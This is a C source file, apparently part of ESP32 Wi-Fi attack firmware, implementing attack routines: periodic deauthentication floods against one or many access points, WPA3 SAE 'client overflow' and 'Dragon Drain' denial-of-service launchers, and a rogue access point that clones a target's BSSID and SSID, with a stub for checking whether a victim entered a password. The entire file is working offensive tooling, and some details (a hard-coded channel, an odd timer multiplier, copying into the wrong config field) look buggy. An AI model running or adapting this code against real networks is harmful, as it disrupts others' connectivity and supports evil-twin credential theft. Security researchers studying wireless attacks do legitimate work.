/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Callback for periodic deauthentication frame timer
 * Periodicaly called to send deauthentication frame for given AP
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

/**
 * @brief Callback for periodic deauthentication frame timer
 * Periodicaly called to send deauthentication frame for given AP
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame_multiple_aps(void *arg){
    WifiApList * wifiApList = (WifiApList *) arg;

    if (wifiApList == NULL || wifiApList->ap_records == NULL) {
        ESP_LOGW(TAG, "No records.");
        return;
    }

    ESP_LOGD(TAG, "APs list (%zu):", wifiApList->count);
    for (size_t i = 0; i < wifiApList->count; i++) {
        ESP_LOGD(TAG, "AP %zu: SSID: %s, channel: %d", 
                 i + 1, 
                 (char*) wifiApList->ap_records[i].ssid, 
                 wifiApList->ap_records[i].primary);  
    }
    wsl_bypasser_send_deauth_frame_multiple_aps(wifiApList->ap_records, wifiApList->count);
}

void resetWifi(int channel) {
    ESP_LOGW(TAG, "Resetting WIFI before attack starts to be able to get rid of connected stations and change channels.");
    esp_wifi_stop();
    esp_wifi_start();

    ESP_LOGD(TAG, "Stopping AP...");

    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };
    esp_err_t retC = esp_wifi_set_country(&wifi_country);
    if (retC != ESP_OK) {
           ESP_LOGE("WIFI", "Failed to set Wi-Fi country code: %s", esp_err_to_name(retC));
    } else {
           ESP_LOGI("WIFI", "Wi-Fi country code set to %s", wifi_country.cc);
    }

    wifi_config_t wifi_config = {
        .ap = {
            .channel = 161/*channel*/,
            .max_connection = 0
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
    if (channel>0)
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    ESP_LOGD(TAG, "AP re-set");
}


void wifictl_wpa3_sae_client_overflow (const wifi_ap_record_t ap_record) {
    ESP_LOGI(TAG, "WPA3 SAE Client Overflow attack started for AP: %s", ap_record.ssid);
    resetWifi(ap_record.primary);
    startRandomMacSaeClientOverflow(ap_record);
}

void wifictl_wpa3_sae_dragon_drain (const wifi_ap_record_t ap_record) {
    ESP_LOGI(TAG, "WPA3 SAE Dragon Drain attack started for AP: %s", ap_record.ssid);
    resetWifi(ap_record.primary);
    start20MacsSaeDragonDrain(ap_record);
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 * Supports more than one AP in the same timer. Changes channels on the fly.
 */
void attack_method_broadcast_multiple_ap(const wifi_ap_record_t ap_recordss[], size_t count, unsigned period_sec){

    WifiApList *ap_list = (WifiApList *) malloc(sizeof(WifiApList)); // Alokacja na stercie
    if (ap_list == NULL) {
        ESP_LOGE(TAG, "Not able to allocate memory for WifiApList!");
        return;
    }

    // Allocating memory for ap_records
    ap_list->ap_records = (wifi_ap_record_t *) malloc(count * sizeof(wifi_ap_record_t));
    if (ap_list->ap_records == NULL) {
        ESP_LOGE(TAG, "Not able to allocate memory for ap_records!");
        free(ap_list);
        return;
    }

    // Copy `ap_recordss` array to a new memory
    memcpy(ap_list->ap_records, ap_recordss, count * sizeof(wifi_ap_record_t));
    ap_list->count = count;

    //just reset, ,no channel selection yet!
    resetWifi(0);


    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame_multiple_aps,
        .arg = (void *) ap_list
    };

    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 10000));
}

//TODO ET start timer responsible for asking Slave if user already provided password. 
void start_password_check_timer(unsigned period_sec) {
    ESP_LOGI(TAG, "Starting password check timer with period: %u seconds", period_sec);

    void password_check_callback(void *arg) {
        ESP_LOGI(TAG, "Checking if user provided password...");
        // Add logic to check if the user has provided the password
    }

    const esp_timer_create_args_t password_check_timer_args = {
        .callback = &password_check_callback,
        .arg = NULL,
        .name = "password_check_timer"
    };

    esp_timer_handle_t password_check_timer_handle;
    ESP_ERROR_CHECK(esp_timer_create(&password_check_timer_args, &password_check_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(password_check_timer_handle, period_sec * 1000000));
}


/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){

    ESP_LOGI(TAG, "attack_method_broadcast invoked, SSID: %s", ap_record->ssid);

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}